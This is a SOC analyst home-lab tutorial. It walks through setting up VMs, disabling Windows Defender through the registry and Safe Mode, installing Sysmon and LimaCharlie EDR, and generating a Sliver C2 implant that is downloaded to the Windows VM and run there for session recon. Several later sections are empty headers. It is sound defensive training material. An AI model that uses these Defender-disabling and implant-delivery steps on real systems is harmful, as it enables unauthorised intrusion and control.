<h2>SOC Analyst Lab 1: Build a SOC Analyst home lab</h2>

_This lab was inspired by [Eric Capuano](https://www.sans.org/profiles/eric-capuano/), an instructor at the SANS Institute. As someone striving to establish a presence in the information security field, I regularly encounter a common question: 'What steps can I take to improve my chances of securing an entry-level SOC analyst position?' This is a question I have consistently asked myself. To address this and translate theoretical learning into practical experience, I delved into the exciting realm of Virtual Machines. This is just the beginning._

---

<h3>Table of Contents:</h3>

1. [Initial Resources to Download](#initial-resources-to-download)
2. [Setup Ubuntu Server VM](#setup-ubuntu-server-vm)
3. [Setup Windows VM](#setup-windows-vm)
4. [Install LimaCharlie EDR on Windows](#install-limacharlie-edr-on-windows)
5. [Setup Attack System](#setup-attack-system)
6. [Generate Our Command and Control Payload](#generate-our-command-and-control-payload)
7. [Start Command and Control Session](#start-command-and-control-session)
8. [Observe EDR Telemetry So Far](#observe-edr-telemetry-so-far)
9. [Let us Get Adversarial](#let-us-get-adversarial)
10. [Now Let us Detect It](#now-let-us-detect-it)
11. [Let us Be Bad Again Now with Detections](#let-us-be-bad-again-now-with-detections)
12. [Blocking Attacks](#blocking-attacks)
13. [Why This Rule](#why-this-rule)
14. [Let us Detect It](#let-us-detect-it)
15. [Let us Block It](#let-us-block-it)

---
<h3>Initial Resources to Download</h3>

1. Download and install a free trial of VMware Workstation.
![001](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/ede505b1-37f5-482e-8f47-863ee5c2c0fa)
2. Download and deploy a free Windows VM directly from Microsoft.
![002](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/a0c91722-7064-4663-9fe8-b2ccd57ff33d)

---
<h3>Setup Ubuntu Server VM</h3>

1. Download and install [Ubuntu Server 22.04.1](https://releases.ubuntu.com/22.04.1/ubuntu-22.04.1-live-server-amd64.iso) into a new VM with the following specs:
    1. 2 CPU cores
    2. 2-4GB RAM
![003](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/18c198de-fd16-4273-8db6-7ce9dff6afe9)
2. During OS install, leave defaults unless otherwise specified > “Continue without updating” > When you get to “Network connections” section, we need to take a few steps to set a static IP address for this VM so that it doesn’t change throughout the lab or beyond it.
![004](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/a4d347f1-9507-4956-ae86-5d78d0c51c13)
   1. Find the gateway IP of our VMware Workstation NAT network. “Edit” > “Virtual Network Editor” > “Type: NAT” > “NAT Settings…”
   2. Copy the “Subnet IP” & “Gateway IP” then close the NAT Settings
![005](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/782c2470-b566-4990-a878-8bcbdaf09dc7)
   3. Back in the Ubuntu installer, let’s change the interface from DHCPv4 to Manual.
![006](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/a96de051-513c-44dc-ab49-eb59a0bea40d)
![007](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/93f5c9a0-c972-4d73-8699-f57840cd9ecd)
![008](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/2124ed46-6c6f-4705-bb8e-ac104c71f066)
![009](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/bc925373-3959-4674-86ce-e88cd34bda3b)
3. **NOTE**: Write down the Linux VM’s IP address because you will need it multiple times throughout this guide.
4. Set-up username and password. I will use these in this lab:
    1. Your name: user
    2. Your server’s name: attack
    3. Username: user
    4. Password: password
![010](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/0e19fddd-659a-46b2-abe4-80ebe13780b5)
5. Install OpenSSH server? click “yes” > continue installing OS until “Install complete!” > Hit Enter on [ Reboot Now ] > Login with username and password then > ping -c 2 google.com
![011](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/9b80129d-1da5-4bf7-84e4-7644362a026d)
![012](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/b08190cd-4c16-4b33-8d8a-4ed8a9a491a9)
![013](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/8655b6dc-8d8f-496b-a241-bf508aea3354)

---
<h3>Setup Windows VM</h3>

Initiate Windows VM<br>
1. Double-click the `WinDev####Eval.ovf` file to import the VM into VMware
2. Disable Virtualize Intel VT-x/EPT or AMD-V/RVI
![014](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/94b0dee9-e5ec-4e58-995f-9e5bcf665ed4)
3. Go ahead and “power on” your Windows VM for the first time.
    1. It will automatically log you in as “user”.
    2. Wait for the desktop to appear.

Disable Defender on Windows VM<br>
1. Disable Tamper Protection: “Start” > “Settings” > “Privacy & security” > “Windows Security” > “Virus & threat protection” > “Virus & threat protection settings” , click “Manage settings” > Toggle OFF the “Tamper Protection” switch, When prompted, click “Yes”
![015](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/3a3bd142-67c8-46bf-a3c1-74568e7ea0d9)
2. Permanently Disable Defender via Group Policy Editor: “Start”> Type “cmd” in the search bar > Run as administrator > Type and run “gpedit.msc” > Double-click “Turn off Microsoft Defender Antivirus”, select “Enabled” > Apply > OK
3. Permanently Disable Defender via Registry: run this in cmd - `REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
4. Prepare to boot into Safe Mode to disable all Defender services: “Start” > run “msconfig” in search > “Boot” > “Boot Options” > Check the box for “Safe boot” and “Minimal” > Click “Apply” and “OK” > System will restart into Safe Mode.
5. In Safe Mode, we’ll disable some services via the Registry: “Start” > run “regedit” in search bar > For each of the following registry locations, browse the key and find the “Start” value, and change it to 4. Once done, leave safe mode, same as step 4.
![016](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/1cdb5d6f-d926-461d-94c2-1049620c961b)
    1. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense`
    2. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot`
    3. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend`
    4. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv`
    5. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc`
    6. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter`
       
Prevent the VM from going into standby<br>

    1. powercfg /change standby-timeout-ac 0
    2. powercfg /change standby-timeout-dc 0
    3. powercfg /change monitor-timeout-ac 0
    4. powercfg /change monitor-timeout-dc 0
    5. powercfg /change hibernate-timeout-ac 0
    6. powercfg /change hibernate-timeout-dc 0
<br>
Install Sysmon in Windows VM (Optional)<br><br>
While not a direct requirement for this guide, Sysmon can be an invaluable analyst tool for obtaining highly detailed telemetry from your Windows endpoint, providing insights into a wide range of intriguing activities. I strongly encourage its adoption, if only for the sake of becoming familiar with its capabilities.<br><br>
        1. Administrative PowerShell > type: “`Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip`" > unzip: “`Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon`"<br>
        2. Download SwiftOnSecurity’s Sysmon config: “`Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml`"<br>
        3. Install Sysmon with Swift’s config: "`C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml`"<br>
        4. Validate Sysmon64 service is installed and running: “`Get-Service sysmon64`"<br>
        5. Check for the presence of Sysmon Event Logs: “`Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`"<br><br>

![017](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/2ce65e8c-b293-4c22-96bd-fbb07c9fecda)
![018](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/5d271d32-6f25-4ec3-9bd9-41aa2f404f81)

---
<h3>Install LimaCharlie EDR on Windows</h3>

LimaCharlie is a relatively new, very powerful “Security Infrastructure as a Service” platform. It not only comes with a cross-platform EDR agent, but also handles all of the log shipping/ingestion and has a threat detection engine.<br>
1. Create a free [LimaCharlie](https://app.limacharlie.io/signup) account.
2. Once logged into LimaCharlie, create an organization
    1. Name: *Anything that is unique*
    2. Data Residency: *whatever is closest*
    3. Demo Configuration Enabled: *disabled*
    4. Template: *Extended Detection & Response Standard*
3. Once the org is created, click “Add Sensor” > select “Windows” > Provide a description such as: `Windows VM - Lab` > Create > Select the Installation Key we just created > Specify the x86-64 (.exe) sensor, but then skip ahead to my instructions versus the ones provided.
![019](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/fb6c8df3-f315-40ff-a80b-452325077b73)
    1. IN THE **WINDOWS VM**, open an Administrative PowerShell prompt and paste the following commands:
`cd C:\Users\User\Downloads`
`Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe`
![020](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/c20081ed-c45e-4ca4-a837-673efb0211e9)
    2. Shift to cmd by typing`cmd.exe` in Administrative PowerShell
    3. Next, we will copy the install command provided by LimaCharlie which contains the installation key. Paste this command into your open terminal.
![021](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/1e884efd-1a68-4431-87bd-da3d0263d0aa)
    4. This is the expected output, ignore the “ERROR” that says “service installed!” then go back to LimaCharlie web UI you should also see the sensor reporting in. Hit “Finish”
![022](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/557db80c-ccc6-424f-8b42-c540260c0952)
![023](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/79b1a721-3b18-4120-b861-18f3fae80f28)
4. Now let’s configure LimaCharlie to also ship the Sysmon event logs alongside its own EDR telemetry
    1. In the left-side menu, click “Artifact Collection”
    2. Next to “Artifact Collection Rules” click “Add Rule”
        1. Name: `windows-sysmon-logs`
        2. Platforms: `Windows`
        3. Path Pattern: `wel://Microsoft-Windows-Sysmon/Operational:*`
        4. Retention Period: `10`
        5. Click “Save Rule”<br>
        
![024](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/7fab9652-91a3-4e38-a95a-f0dd97bb89eb)

   3. LimaCharlie will now start shipping Sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC’s own telemetry, but Sysmon is still a very power visibility tool that runs well alongside any EDR agent.
      a. The other reason we are ingesting Sysmon logs is that the built-in Sigma rules we previously enabled largely depend on Sysmon logs as that is what most of them were written for.

---
<h3>Setup Attack System</h3>

1. We’ll SSH to access Linux VM >`ssh user@192.168.159.131` > `sudo su`
2. Run the following commands to download [Sliver](https://github.com/BishopFox/sliver/wiki), a Command & Control (C2) framework by BishopFox. I recommend copy/pasting the entire block as there is line-wrapping occurring.
    
    ```
    # Download Sliver Linux server binary
    wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
    # Make it executable
    chmod +x /usr/local/bin/sliver-server
    # install mingw-w64 for additional capabilities
    apt install -y mingw-w64
    ```
    
3. Now let’s create a working directory we’ll use in future steps
    
    ```
    # Create our future working directory
    mkdir -p /opt/sliver
    ```
<h3>Generate Our Command and Control Payload</h3>

1. Drop into a root shell and change directory to our Sliver install
    
    ```
    sudo su
    ```
    
    ```
    cd /opt/sliver
    ```
2. Launch Sliver server
    ```
   sliver-server
    ```
    ![025](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/745f7393-ff95-4f0e-ae4f-c25eb28a2932)

3. Generate our first C2 session payload (within the Sliver shell above). Be sure to use your Linux VM’s IP address we statically set in Part 1.<br>
   ```
   generate --http [Linux_VM_IP] --save /opt/sliver
   ```
    ![026](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/1dab0c2f-8b4a-4ce0-997b-c8e3ca769521)

4. Confirm the new implant configuration
   ```
   implants
   ```
   ![027](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/c3c0aef2-beb0-49e0-b4d4-89f85d64ba77)

5. Now we have a C2 payload we can drop onto our Windows VM. We’ll do that next. Go ahead and exit Sliver for now.
    
    ```
    exit
    ```
    
6. To easily download the C2 payload from the Linux VM to the Windows VM, let’s use a little python trick that spins up a temporary web server.
    
    ```
    cd /opt/sliver
    ```
    
    ```
    python3 -m http.server 80
    ```
    
7. Switch to the **Windows VM** and launch an **Administrative PowerShell console**.
   Now run the following command to download your C2 payload from the Linux VM to the Windows VM, swapping your own Linux VM IP `[Linux_VM_IP]` and the name of the payload we generated in Sliver `[payload_name]` a few steps prior.
        
        ```
        IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
        ```
        
8. Now would be a good time to snapshot your Windows VM, before we execute the malware.
   Snapshot name: “Malware staged”

<h3>Start Command and Control Session</h3>

1. Now that the payload is on the Windows VM, we must switch back to the **Linux VM** SSH session and enable the Sliver HTTP server to catch the callback.
    a. First, terminate the python web server we started by pressing `Ctrl + C`
    b. Now, relaunch Sliver
        
        ```
        sliver-server
        ```
        
    c. Start the Sliver HTTP listener
        
        ```
        http
        ```
        
    d. If you get an error starting the HTTP listener, try rebooting the Linux VM and retrying.
2. Return to the **Windows VM** and execute the C2 payload from its download location using the same **administrative** PowerShell prompt we had from before
    
    ```
    C:\Users\User\Downloads\<your_C2-implant>.exe
    ```
    
3. Within a few moments, you should see your session check in on the Sliver server
   ![028](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/12d0fb2b-3599-48b8-a3c1-5e5a8dbea645)

4. Verify your session in Sliver, taking note of the Session ID
   ```
   sessions
   ```
   ![029](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/e64ab6ef-18d8-44a6-aa3d-f4055afe077e)

5. To interact with your new C2 session, type the following command into the Sliver shell, swapping [session_id] with yours
   ```
   use [session_id]
   ```
   ![030](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/cd65748e-37d7-4066-9076-51918d191ca1)

6. You are now interacting directly with the C2 session on the Windows VM. Let’s run a few basic commands to get our bearing on the victim host.
    a. Get basic info about the session
    
    ```
    info
    ```
    
    b. Find out what user your implant is running as, and learn it’s privileges
    
    ```
    whoami
    ```
    
    ```
    getprivs
    ```
    
    If your implant was properly run with Admin rights, you’ll notice we have a few privileges that make further attack activity much easier, such as “SeDebugPrivilege” — if you do not see these privileges, make sure you ran the implant from an Administrative command prompt.<br>
    ![031](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/d5ab3804-4352-45b6-9f10-9c00f7a9f89f)

    c. Identify our implant’s working directory and Examine network connections occurring on the remote system

```
pwd
```
```
netstat
```
```
ps -T
```
   1. Notice that Sliver cleverly highlights its own process in green.
   2. `rphcp.exe` is the LimaCharlie EDR service executable

d. Identify running processes on the remote system

Notice that Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red.<br>
![032](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/004a57ab-6b91-4e0c-8e41-ab0045195c2a)<br>
![033](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/25f4125d-a60d-4976-9565-7e272936509b)<br>

---
<h3>Observe EDR Telemetry So Far</h3>
1. Let’s hop into the [LimaCharlie web UI](https://app.limacharlie.io/) and check out some basic features.<br>
    a. Click “Sensors” on left menu<br>
    b. Click your active Windows sensor<br>
    c. On the new left-side menu for this sensor, click Processes<br>
![034](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/d000434e-757b-4000-9132-8da18a1b63aa)<br>
![035](https://github.com/ButchBytes-sec/ButchBytes-sec/assets/78964580/ba6bcb4c-b2cb-4baf-9ee6-57a2c97ed23b)<br>





    
---
<h3>Let us Get Adversarial</h3>

---
<h3>Now Let us Detect It</h3>

---
<h3>Let us Be Bad Again Now with Detections</h3>

---
<h3>Blocking Attacks</h3>

---
<h3>Why This Rule</h3>

---
<h3>Let us Detect It</h3>

---
<h3>Let us Block It</h3>



